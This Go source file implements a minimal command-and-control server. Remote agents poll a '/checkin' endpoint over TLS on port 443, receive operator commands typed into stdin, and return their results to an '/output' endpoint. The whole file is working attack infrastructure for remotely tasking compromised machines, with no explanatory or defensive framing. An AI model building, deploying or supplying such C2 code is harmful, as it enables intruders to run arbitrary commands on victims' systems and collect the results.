package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
)

var pendingCmd string = "sleep"

func checkinHandler(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	fmt.Println("[checkin]", string(body))
	fmt.Fprintf(w, pendingCmd)
	pendingCmd = "sleep" //clear after sending
}

func readInput() {
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		pendingCmd = scanner.Text()
		fmt.Println("[*] Command queued:", pendingCmd)
	}
}

func outputHandler(w http.ResponseWriter, r *http.Request) {
	body, _ := io.ReadAll(r.Body)
	fmt.Println(string(body))
}

func main() {
	http.HandleFunc("/checkin", checkinHandler)
	fmt.Println("[+] Server listening on :443")
	http.HandleFunc("/output", outputHandler)
	go readInput()
	http.ListenAndServeTLS(":443", "server.crt", "server.key", nil)
}
